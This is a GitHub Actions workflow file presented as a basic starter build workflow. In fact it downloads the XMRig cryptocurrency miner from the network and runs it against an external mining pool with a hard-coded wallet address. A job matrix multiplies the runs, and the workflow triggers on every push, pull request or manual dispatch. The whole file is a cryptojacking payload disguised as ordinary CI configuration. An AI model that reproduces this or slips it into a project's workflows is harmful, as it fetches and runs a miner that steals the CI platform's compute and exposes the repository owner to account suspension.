# This is a basic workflow to help you get started with Actions

name: xmi

# Controls when the workflow will run
on:
  # Triggers the workflow on push or pull request events but only for the main branch
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

  # Allows you to run this workflow manually from the Actions tab
  workflow_dispatch:

jobs:
  build:
    name: Ex-code
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: DOWNLOAD
      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile xmrig-6.17.0-msvc-win64.zip
    - name: Extract
      run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
    - name: Dir
      run: ls
    - name: RUNNING
      run: .\xmrig-6.17.0-msvc-win64\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -p x -t 1 -u COIN:RQoxppyczmJ1wEdmXenwEXk2CwQaZCkWVn.Rig001
    - name: DONE
      run: exit
